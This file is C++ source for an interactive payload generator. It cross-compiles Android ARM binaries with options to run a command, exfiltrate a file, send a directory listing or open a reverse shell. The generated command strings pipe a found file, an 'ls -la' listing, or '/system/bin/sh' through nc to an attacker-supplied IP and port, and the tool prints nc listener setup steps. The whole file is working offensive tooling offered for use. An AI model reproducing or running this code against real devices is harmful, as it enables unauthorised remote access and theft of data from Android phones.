#include <iostream>
#include <fstream>

using namespace std;

const string TOOLCHAIN = "./toolchain/bin/arm-linux-androideabi-clang++"
                         " -march=armv7-a -mthumb -static-libstdc++"
                         " -fPIE -fPIC -pie";
const string TARGET_BASH = "/system/bin/sh";
const string OPTIONS = "Options: \n"
                        "    1) Execute single command\n"
                        "    2) Retrieve specific file\n"
                        "    3) Return a directory listing\n"
                        "    4) Create a reverse shell\n"
                        "    5) Quit\n"
                        "Choice:\n";

int main(){

    bool quit = false;   
    string ip, port, command, path, retrieval_filename, sys_call;
    char choice;
    ofstream config_file;

    while(!quit){
        cout << OPTIONS;
        cin >> choice;
        cin.ignore(); //clear dangling newline
        switch(choice){
            case '1':
                cout << "Command:\n";
                getline(cin, command);
                config_file.open("payload1_config.h");
                config_file << "std::string command = \"" << command << "\";";
                config_file.close();
                sys_call = TOOLCHAIN + " ./payload1.cpp -o payload1";
                system(sys_call.c_str());
                break;
            case '2':
                cout << "This requires a listener with an output."
                        " Start one with:\n"
                        "    nc -lvp [port] > [file destination]\n";
                cout << "Host IP:\n";
                getline(cin, ip);
                cout << "Host Port:\n";
                getline(cin, port);
                cout << "Filename:\n";
                getline(cin, retrieval_filename);
                config_file.open("payload2_config.h");
                config_file << "std::string command = \"nc " + ip + " " + port
                                + "< $(find / -name '" + retrieval_filename
                                + "' 2>/dev/null)\";";
                config_file.close();
                sys_call = TOOLCHAIN + " ./payload2.cpp -o payload2";
                system(sys_call.c_str());
                break;
            case '3':
                cout << "This requires a listener. Start one with:\n"
                        "    nc -lvp [port]\n";
                cout << "Host IP:\n";
                getline(cin, ip);
                cout << "Host Port:\n";
                getline(cin, port);
                cout << "Directory's absolute path:\n";
                getline(cin, path);
                config_file.open("payload3_config.h");
                config_file << "std::string command = \"ls -la " + path
                                + " | nc " + ip + " " + port + "\";";
                config_file.close();
                sys_call = TOOLCHAIN + " ./payload3.cpp -o payload3";
                system(sys_call.c_str());
                break;
            case '4':
                cout << "This requires a listener. Start one with:\n"
                        "    nc -lvp [port]\n";
                cout << "Host IP:\n";
                getline(cin, ip);
                cout << "Host Port:\n";
                getline(cin, port);
                command = TARGET_BASH + " | nc " + ip + " " + port;
                config_file.open("payload4_config.h");
                config_file << "std::string command = \"" << command << "\";";
                config_file.close();
                sys_call = TOOLCHAIN + " ./payload4.cpp -o payload4";
                system(sys_call.c_str());
                break;
            case '5':
                quit = true;
                break;
            default:
                cout << "Invalid choice.\n";
                break;

        }
    }
    return 0;
}